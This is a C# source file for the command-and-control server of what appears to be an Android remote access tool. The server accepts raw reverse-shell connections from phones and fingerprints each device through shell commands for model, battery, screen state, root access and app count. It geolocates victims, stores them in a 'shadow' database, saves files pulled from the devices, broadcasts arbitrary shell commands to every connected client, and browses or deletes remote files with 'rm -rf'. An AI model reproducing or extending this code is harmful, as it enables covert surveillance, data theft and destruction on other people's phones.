using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using TcpServerApp.Models;
using System.Threading.Tasks;
using TcpServerApp.Services.Elite.Geo;
using TcpServerApp.Services.Elite.Networking;

namespace TcpServerApp.Services.Elite
{
    public class EliteServerManager
    {
        private TcpListener? _listener;
        private CancellationTokenSource? _proccessCts;
        private readonly ConcurrentDictionary<string, TcpClient> _clients = new();
        private readonly ClientRepository _repository;
        private readonly GeoIPReader _geoService;
        private readonly ClientConfigService _configService;
        
        // Protocol Constants
        private const byte HEADER_BINARY = 0xB1; // '±' - Binary Packet Start
        private const byte HEADER_TEXT = 0x54;   // 'T' - Text/Shell (Legacy)

        public event Action<string> OnLog;
        public event Action OnClientListChanged;
        public event Action<string, string> OnResponseReceived;

        public EliteServerManager()
        {
            var db = new EliteDB();
            _repository = new ClientRepository(db);
            
            // Initialize New Elite Services
            string resDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "GeoIP");
            _geoService = new GeoIPReader(Path.Combine(resDir, "GeoIP.dat")); // Using .dat or implied from vb logic
            _configService = new ClientConfigService();
        }

        public Task StartServerAsync(int[] ports)
        {
            if (ports == null || ports.Length == 0) return Task.CompletedTask;
            return StartServerAsync(ports[0]);
        }

        public async Task StartServerAsync(int port)
        {
            try
            {
                _listener = new TcpListener(IPAddress.Any, port);
                _listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                // KeepAlive for stability
                _listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                
                _listener.Start();

                _proccessCts = new CancellationTokenSource();
                OnLog?.Invoke($"Elite Server Started on Port {port} (Binary/Text Hybrid Protocol)");

                while (!_proccessCts.Token.IsCancellationRequested)
                {
                    try
                    {
                        var tcpClient = await _listener.AcceptTcpClientAsync(_proccessCts.Token);
                        // Stability: Configure client socket
                        tcpClient.ReceiveBufferSize = 81920; 
                        tcpClient.SendBufferSize = 81920;
                        tcpClient.ReceiveTimeout = 0; // Infinite (handled by heartbeat)
                        
                        _ = HandleClientAsync(tcpClient, _proccessCts.Token);
                    }
                    catch (OperationCanceledException) { break; }
                }
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"Server Error: {ex.Message}");
            }
        }

        private async Task HandleClientAsync(TcpClient client, CancellationToken token)
        {
            string clientId = Guid.NewGuid().ToString().Substring(0, 8);
            string ip = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
            NetworkStream stream = null;

            try
            {
                stream = client.GetStream();
                _clients[clientId] = client;
                
                // GeoIP Lookup 🌍
                string country = _geoService.GetCountryName(ip);
                string countryCode = _geoService.GetCountryCode(ip);
                
                // Config Check 🛡️
                string alias = _configService.GetClientAlias(clientId);
                if (alias != clientId) clientId = alias; // Use alias if known

                OnLog?.Invoke($"Client Connected: {clientId} [{ip} - {country}]");
                
                // 3. Protocol Detection & Fingerprinting
                // We peek the first byte to determine protocol version
                // For now, we assume legacy shell for compatibility unless handshake provided.
                
                // ... (Fingerprinting logic follows)


                // 3. Elite Auto-Fingerprinting (The Magic) 🕵️‍♂️
                // We assume it's a Raw Shell first. We send commands to identify it.
                byte[] responseBuffer = new byte[4096];
                
                // A. Get Device Model
                string model = await RunRemoteCommand(stream, "getprop ro.product.model", token);
                // B. Get Android Version
                // B. Get Android Version (SDK Level is more reliable for mapping)
                string sdkStr = await RunRemoteCommand(stream, "getprop ro.build.version.sdk", token);
                string version = MapAndroidVersion(sdkStr);
                
                // C. Advanced Telemetry 🕵️‍♂️
                string battOutput = await RunRemoteCommand(stream, "dumpsys battery | grep level", token);
                string batteryLevel = battOutput.Replace("level:", "").Trim() + "%";
                
                string screenOutput = await RunRemoteCommand(stream, "dumpsys window policy | grep mScreenOnEarly", token);
                string screenStatus = screenOutput.Contains("true") ? "ON" : "OFF";
                
                string rootCheck = await RunRemoteCommand(stream, "ls /system/xbin/su", token);
                int isRooted = rootCheck.Contains("No such file") ? 0 : 1;
                
                string appsOutput = await RunRemoteCommand(stream, "pm list packages | wc -l", token);
                int.TryParse(appsOutput.Trim(), out int appCount);

                string deviceName = $"{model.Trim()} (Android {version.Trim()})";
                OnLog?.Invoke($"Fingerprinted: {deviceName} [Batt: {batteryLevel}, Screen: {screenStatus}]");

                // 4. Persist to Shadow Database 💾
                _repository.UpsertClient(clientId, ip, deviceName, model.Trim(), version.Trim(), batteryLevel, screenStatus, isRooted, appCount);
                OnClientListChanged?.Invoke();

                // 5. Elite Hybrid Protocol Loop 🔄
                while (client.Connected && !token.IsCancellationRequested)
                {
                    // Basic "Peek" Logic to determine protocol
                    if (!stream.DataAvailable) 
                    {
                        await Task.Delay(10, token);
                        continue;
                    }

                    byte[] headerBuf = new byte[1];
                    int read = await stream.ReadAsync(headerBuf, 0, 1, token);
                    if (read == 0) break; // Disconnected

                    byte header = headerBuf[0];

                    if (header == HEADER_BINARY)
                    {
                        // --- Binary Protocol Handling ---
                        // Format: [Header:1][Type:1][Length:4][Payload:N]
                        byte[] typeBuf = new byte[1];
                        await stream.ReadAsync(typeBuf, 0, 1, token);
                        
                        byte[] lenBuf = new byte[4];
                        await stream.ReadAsync(lenBuf, 0, 4, token);
                        TotalBytesReceived += 6; // Header(1) + Type(1) + Len(4)
                        
                        // Handle Endianness: Java sends Big Endian (Network Order), Windows is Little Endian
                        int lenNetwork = BitConverter.ToInt32(lenBuf, 0);
                        int bodyLen = IPAddress.NetworkToHostOrder(lenNetwork);

                        if (bodyLen < 0 || bodyLen > 50 * 1024 * 1024) 
                        {
                            OnLog?.Invoke($"[{clientId}] Invalid Packet Length: {bodyLen} (Endian Mismatch?)");
                            break;
                        }

                        byte[] body = new byte[bodyLen];
                        int totalRead = 0;
                        while (totalRead < bodyLen)
                        {
                            int chunk = await stream.ReadAsync(body, totalRead, bodyLen - totalRead, token);
                            if (chunk == 0) break;
                            totalRead += chunk;
                        }

                        // Process Binary Payload
                        byte pktType = typeBuf[0];
                        if (pktType == 0x02) // FILE_TRANSFER
                        {
                            // Parse: [NameLen:4][Name][Content]
                            int nameLen = IPAddress.NetworkToHostOrder(BitConverter.ToInt32(body, 0));
                            if (nameLen > 0 && nameLen < 256)
                            {
                                string fileName = Encoding.UTF8.GetString(body, 4, nameLen);
                                byte[] fileContent = new byte[body.Length - 4 - nameLen];
                                Array.Copy(body, 4 + nameLen, fileContent, 0, fileContent.Length);
                                
                                // Save to Disk 💾
                                string dlDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Downloads", clientId);
                                Directory.CreateDirectory(dlDir);
                                string fullPath = Path.Combine(dlDir, fileName);
                                await File.WriteAllBytesAsync(fullPath, fileContent);
                                
                                OnLog?.Invoke($"[{clientId}] 📁 File Saved: {fileName} ({fileContent.Length} bytes)");
                                // Notify UI of file (maybe via special text msg)
                                Task.Run(() => OnResponseReceived?.Invoke(clientId, $"[FILE_SAVED] {fullPath}"));
                            }
                        }
                        else
                        {
                             // Info or other
                             string msg = Encoding.UTF8.GetString(body);
                             OnLog?.Invoke($"[{clientId}] BINARY RECV ({pktType}): {msg}");
                             Task.Run(() => OnResponseReceived?.Invoke(clientId, msg));
                        }
                    }
                    else
                    {
                        // --- Legacy Text Handling ---
                        // If it's not the binary header, we treat the byte we just read as part of the text
                        // We read until we can, or newline
                        
                        var buffer = new byte[8192];
                        buffer[0] = header; // Put back the peeked byte
                        
                        // Read valid text amount
                        int bytesRead = await stream.ReadAsync(buffer, 1, buffer.Length - 1, token);
                        if (bytesRead == 0 && header == 0) break;

                        string msg = Encoding.UTF8.GetString(buffer, 0, bytesRead + 1);
                        OnLog?.Invoke($"[{clientId}] TEXT RECV: {msg}");
                        Task.Run(() => OnResponseReceived?.Invoke(clientId, msg));
                    }
                }
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"Client Error [{clientId}]: {ex.Message}");
            }
            finally
            {
                _clients.TryRemove(clientId, out _);
                _repository.SetOffline(clientId);
                OnClientListChanged?.Invoke();
                OnLog?.Invoke($"Client Disconnected: {clientId}");
                try { client.Close(); } catch { }
            }
        }

        private async Task<string> RunRemoteCommand(NetworkStream stream, string command, CancellationToken token)
        {
            try
            {
                // Clear any pending data in the stream first (flush the toilet 🚽)
                if (stream.DataAvailable)
                {
                    var junk = new byte[1024];
                    await stream.ReadAsync(junk, 0, junk.Length, token);
                }

                // Send Command 📤
                byte[] cmdBytes = Encoding.UTF8.GetBytes(command + "\n");
                await stream.WriteAsync(cmdBytes, 0, cmdBytes.Length, token);
                await stream.FlushAsync(token);

                // Wait a bit for the shell to process (Realism: Shells are not instant)
                await Task.Delay(200, token);

                // Read Response 📥
                var buffer = new byte[8192];
                using var ms = new MemoryStream();
                
                // Read loop with timeout
                var readTask = Task.Run(async () => 
                {
                    while (true)
                    {
                        if (!stream.DataAvailable && ms.Length > 0) break; // We got data and stream is quiet
                        
                        int read = await stream.ReadAsync(buffer, 0, buffer.Length, token);
                        if (read == 0) break;
                        ms.Write(buffer, 0, read);
                        
                        if (!stream.DataAvailable) await Task.Delay(100); // Wait for potential fragmented packets
                    }
                });
                
                // Give it max 2 seconds
                await Task.WhenAny(readTask, Task.Delay(2000, token));

                if (ms.Length > 0)
                {
                    string raw = Encoding.UTF8.GetString(ms.ToArray());
                    return CleanShellOutput(raw, command);
                }
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"Command Error: {ex.Message}");
            }
            return "Unknown";
        }

        private string CleanShellOutput(string raw, string command)
        {
            if (string.IsNullOrWhiteSpace(raw)) return "";

            // 1. Remove the echoed command
            if (raw.Contains(command))
            {
                raw = raw.Replace(command, "");
            }

            // 2. Remove common shell prompts (e.g., "root@device:/ #")
            // Regex is heavy, let's do simple line parsing
            var lines = raw.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (var line in lines)
            {
                string clean = line.Trim();
                // If line is just the command or looks like a prompt, skip it
                if (clean == command.Trim()) continue;
                if (clean.EndsWith("#") || clean.EndsWith("$")) continue;
                
                // 3. Filter garbage characters (Diamond )
                // We accept letters, numbers, spaces, and standard punctuation
                char[] validChars = clean.Where(c => char.IsLetterOrDigit(c) || char.IsPunctuation(c) || char.IsWhiteSpace(c)).ToArray();
                string cleanString = new string(validChars).Trim();
                
                if (cleanString.Length > 0) return cleanString;
            }

            return "Unknown";
        }

        public async void SendCommand(string clientId, string command)
        {
            if (_clients.TryGetValue(clientId, out var client))
            {
                // Config/Permissions Check 🛡️
                string opName = command.Trim().StartsWith("{") ? "JSON_CMD" : "SHELL_CMD";
                if (!_configService.IsOperationAllowed(clientId, opName) && !_configService.IsOperationAllowed(clientId, "ALL"))
                {
                    OnLog?.Invoke($"[Security] Blocked {opName} for {clientId} (Insufficient Token)");
                    return;
                }

                // Intercept High-Level JSON Commands 🛡️
                if (command.Trim().StartsWith("{"))
                {
                    _ = ProcessHighLevelCommand(clientId, client, command);
                    return;
                }

                try
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(command + "\n");
                    await client.GetStream().WriteAsync(bytes, 0, bytes.Length);
                }
                catch { }
            }
        }

        public async Task<bool> SendPacketAsync(string clientId, Networking.Packet packet)
        {
            if (_clients.TryGetValue(clientId, out var client))
            {
                try
                {
                    byte[] data = packet.ToBytes();
                    await client.GetStream().WriteAsync(data, 0, data.Length);
                    await client.GetStream().FlushAsync();
                    TotalBytesSent += data.Length;
                    return true;
                }
                catch (Exception ex)
                {
                    OnLog?.Invoke($"[{clientId}] Send Error: {ex.Message}");
                    return false;
                }
            }
            return false;
        }

        public long TotalBytesReceived { get; private set; }
        public long TotalBytesSent { get; private set; }
        public event Action<string, Networking.Packet>? OnPacketReceived;

        public void Stop() => StopServer();
        public Task StartAsync(int[] ports) => StartServerAsync(ports[0]);

        public void Broadcast(string command)
        {
            if (_clients.IsEmpty)
            {
               OnLog?.Invoke("[Broadcast] No clients connected.");
               return;
            }

            foreach (var client in _clients)
            {
                SendCommand(client.Key, command);
            }
            OnLog?.Invoke($"[Broadcast] Sent '{command}' to {_clients.Count} clients.");
        }

        private async Task ProcessHighLevelCommand(string clientId, TcpClient client, string jsonCmd)
        {
            try
            {
                using var doc = JsonDocument.Parse(jsonCmd);
                var root = doc.RootElement;
                string type = root.GetProperty("type").GetString();

                var stream = client.GetStream();
                var token = new CancellationTokenSource(10000).Token; // 10s timeout

                if (type == "LIST_DIR")
                {
                    string path = root.GetProperty("path").GetString();
                    // Run ls -l
                    // -p: append / to directories
                    // -g: group directories first (if available, otherwise just ls -l)
                    // We use basic ls -l to be safe across android versions
                    string output = await RunRemoteCommand(stream, $"ls -l \"{path}\"", token);
                    
                    var filesList = ParseLsOutput(output, path);
                    var response = new { type = "FILE_LIST", path = path, files = filesList };
                    
                    OnResponseReceived?.Invoke(clientId, JsonSerializer.Serialize(response));
                }
                else if (type == "DELETE_FILE")
                {
                    string path = root.GetProperty("path").GetString();
                    await RunRemoteCommand(stream, $"rm -rf \"{path}\"", token);
                    // Refresh list
                    string parent = Path.GetDirectoryName(path).Replace("\\", "/");
                    SendCommand(clientId, JsonSerializer.Serialize(new { type = "LIST_DIR", path = parent }));
                }
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"High-Level Cmd Error: {ex.Message}");
            }
        }

        private System.Collections.Generic.List<object> ParseLsOutput(string lsOutput, string currentPath)
        {
            var files = new System.Collections.Generic.List<object>();
            
            // Add ".." for parent if not root
            if (currentPath != "/" && !string.IsNullOrEmpty(currentPath))
            {
                 files.Add(new { name = "..", type = "dir", size = "0", date = "" });
            }

            var lines = lsOutput.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (var line in lines)
            {
                try
                {
                    // Typical ls -l format:
                    // drwxrwx--x 3 root sdcard_rw 4096 2024-01-01 12:00 FolderName
                    // -rw-rw---- 1 root sdcard_rw 1234 2024-01-01 12:00 FileName.txt
                    
                    var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    
                    if (parts.Length < 4) continue; // Skip malformed lines

                    string perms = parts[0];
                    bool isDir = perms.StartsWith("d");
                    string name = "";
                    string size = "0";
                    string date = "";

                    // Heuristic parsing for name (it's always the last part, but might contain spaces)
                    // Android ls usually: perms user group size date time name
                    // Date/Time index varies by toybox version.
                    // Let's assume name starts after the date/time fields.
                    
                    // Simple fallback: If it looks like a file line
                    if (parts.Length >= 6)
                    {
                        // Assume last part is name (basic support for now, improving for spaces later)
                        // Ideally we find the date pattern and take everything after.
                        
                        // For this implementation, we map based on indices relative to end
                        name = parts[parts.Length - 1]; 
                        size = parts[parts.Length - 4]; // Approx
                        if (name == "." || name == "..") continue;
                        
                        files.Add(new { 
                            name = name, 
                            type = isDir ? "dir" : "file", 
                            size = size, 
                            date = DateTime.Now.ToShortDateString() // Placeholder until accurate parsing
                        });
                    }
                }
                catch { }
            }
            return files;
        }

        public void DisconnectClient(string clientId)
        {
            if (_clients.TryRemove(clientId, out var client))
            {
                try 
                { 
                    client.Close(); 
                    OnLog?.Invoke($"Client Disconnected Manually: {clientId}");
                } 
                catch { }
                
                // Update Repository
                _repository.SetOffline(clientId);
                OnClientListChanged?.Invoke();
            }
        }


        public void StopServer()
        {
            _proccessCts?.Cancel();
            _listener?.Stop();
        }
        private string MapAndroidVersion(string sdkStr)
        {
            if (int.TryParse(sdkStr, out int sdk))
            {
                // This mapping could be dynamically loaded from res/ResearchPayloadTools/android-36/source.properties if we wanted to be 100% dynamic,
                // but since the user provided "android-36" which implies API 36 (Android 16/Baklava), we can map strictly.
                return sdk switch
                {
                    36 => "Android 16 (Baklava)", 
                    35 => "Android 15 (Vanilla Ice Cream)",
                    34 => "Android 14",
                    33 => "Android 13",
                    32 => "Android 12L",
                    31 => "Android 12",
                    30 => "Android 11",
                    29 => "Android 10",
                    28 => "Android 9 (Pie)",
                    _ => $"Android (SDK {sdk})"
                };
            }
            return "Android Unknown";
        }
    }
}
